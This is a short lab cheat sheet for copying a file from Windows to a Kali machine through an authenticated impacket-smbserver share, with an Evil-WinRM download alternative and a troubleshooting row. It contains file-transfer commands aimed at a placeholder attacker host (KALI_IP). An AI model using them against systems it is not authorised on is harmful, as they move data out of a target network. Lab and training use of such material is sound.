## Copy a Windows file into an authenticated lab share

**Run in:** Windows cmd.exe. **Requires:** On Kali first run an authenticated impacket-smbserver named share over a dedicated writable transfer folder; TCP 445 must be reachable from Windows.

```console
net use \\KALI_IP\share /user:transfer TRANSFER_PASSWORD
copy C:\path\file.zip \\KALI_IP\share\file.zip
```

**What the result establishes:** Identify which side listens and which side initiates; verify the received filename, size and digest.

**Next check:** Inspect destination rights and filename, compare size and SHA-256 at both ends, then disconnect this share with net use when finished.

## 1. Kali — receive folder and SMB server

**Kali**

```bash
mkdir -p ~/transfer
sudo impacket-smbserver share ~/transfer -smb2support -user transfer -password 'TRANSFER_PASSWORD'
```

Keep this terminal running. Replace TRANSFER_PASSWORD in both commands.

## Alternative — if already in Evil-WinRM

**Evil-WinRM prompt**

```bash
download C:\path\file.zip ./file.zip
```

Saves the file on the Kali machine running Evil-WinRM.

## If it fails

| Symptom | Check |
| --- | --- |
| The share connects but the destination copy fails | HTTP download commands cannot upload by themselves; outbound connectivity, listener binding and destination write access all matter. |
